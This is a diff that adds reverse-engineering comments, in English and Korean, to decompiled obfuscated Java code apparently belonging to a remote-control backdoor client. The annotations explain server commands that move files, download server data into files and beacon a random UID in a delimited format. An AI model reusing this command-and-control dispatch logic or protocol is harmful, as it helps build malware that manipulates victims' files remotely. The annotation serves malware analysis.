@@ -121,6 +121,13 @@ public class client {
                                     // TODO Analyze more
                                     (new b(var21[1], var21[2])).start();
                                 } else if (var21[0].equals(k.q)) {  // @0004
+                                    // mv var21[1] to var21[2], don't care wheater this is file or dir
+                                    /*
+                                     * ex in linux) mv "var21[1]" "var21[2]"
+                                     * 0: failed due to security exception
+                                     * 1: succeeded
+                                     * 2: var21[2] is already existing
+                                     */
                                     (new h(var21[1], var21[2])).start();
                                 } else if (var21[0].equals(k.r)) {  // @0005
                                     // var21[1~3]을 인자로 d.a를 call한다.
@@ -133,6 +140,8 @@ public class client {
                                     // 서버로부터 무언가를 받아서 var21[1]이라는 파일에 기록한다.
                                     (new d(k.b, k.c, var21[1], var21[2], var21[3], "1")).start();
                                 } else if (var21[0].equals(k.t)) {  // @0007
+                                    // send random UID to server
+                                    // "(random UID) + $#@ + @0001 + $#@ + &&&"
                                     (new g()).start();
                                 } else if (var21[0].equals(k.u)) {  // @0008
                                     (new j(k.b, k.c)).start();
